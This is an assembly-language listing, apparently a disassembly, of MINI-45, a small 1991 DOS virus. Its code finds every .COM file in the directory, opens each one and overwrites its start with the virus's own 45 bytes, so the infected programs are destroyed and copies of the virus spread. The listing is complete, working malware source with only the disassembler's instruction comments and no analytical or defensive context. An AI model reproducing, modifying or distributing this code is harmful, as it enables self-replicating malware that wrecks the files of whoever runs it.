

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             MINI-45                                  ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   26-Mar-91                                            ÛÛ
;ÛÛ      Passes:    5          Analysis Flags on: H                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

seg_a           segment
                assume  cs:seg_a, ds:seg_a

                org     100h

mini-45         proc    far

start:
                mov     dx,127h
                mov     ah,4Eh                  ; 'N'
loc_1:
                int     21h                     ; DOS Services  ah=function 4Eh
                                                ;  find 1st filenam match @ds:dx
                jc      loc_ret_3               ; Jump if carry Set
                mov     dx,9Eh
                mov     ax,3D02h
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                jc      loc_2                   ; Jump if carry Set
                xchg    ax,bx
                mov     dx,100h
                mov     cx,2Dh
                mov     ah,40h                  ; '@'
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
loc_2:
                mov     ah,4Fh                  ; 'O'
                jmp     short loc_1             ; (0105)

loc_ret_3:
                retn
                db      2Ah, 2Eh, 63h, 6Fh, 6Dh, 0

mini-45         endp

seg_a           ends
                end     start

